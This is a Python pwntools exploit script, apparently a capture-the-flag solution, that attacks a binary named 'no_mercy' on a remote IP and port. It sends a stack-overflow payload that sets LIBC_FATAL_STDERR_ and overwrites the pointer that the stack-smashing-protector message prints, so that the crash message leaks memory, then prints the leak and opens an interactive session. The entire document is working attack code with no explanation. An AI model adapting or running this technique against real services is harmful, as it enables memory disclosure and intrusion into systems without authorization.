from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

bin = ELF("./no_mercy")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

p = remote("52.50.127.68", 44444)

#p = process("./no_mercy", env=env)
#gdb.attach(p)

leak_addr = 0x08048573
payload = "a"*6 + \
          "LIBC_FATAL_STDERR_=1".ljust(0x20, "1")*3
payload = payload.ljust(234, "a")
payload += p32(leak_addr) + \
           "a"*4 + \
           p32(0xffffd830)
payload += "LIBC_FATAL_STDERR_=1".ljust(0x20, "1")*50
p.sendline(payload)
p.sendline("b")

p.recvuntil("stack smashing detected ***: ")
a = p.recvuntil(" terminated")

print(a.encode('hex'))

p.interactive()
